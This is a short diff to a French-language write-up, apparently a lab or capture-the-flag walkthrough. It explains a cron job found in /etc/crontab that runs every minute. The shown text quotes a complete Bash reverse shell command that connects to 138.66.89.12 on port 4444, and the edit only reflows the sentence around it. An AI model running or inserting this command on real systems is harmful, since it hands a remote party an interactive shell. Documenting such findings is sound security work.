@@ -143,7 +143,8 @@ cat /etc/crontab
 
 Cette commande ouvre un shell Bash et redirige son entrée/sortie vers l'adresse IP 138.66.89.12 avec le port 4444.
 
-Le Cron job est configuré pour s'exécuter toutes les minutes (*/1 * * * *). Il exécute la commande 
+Le Cron job est configuré pour s'exécuter toutes les minutes (*/1 * * * *). 
+Il exécute la commande :
 
 ```
 /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'.
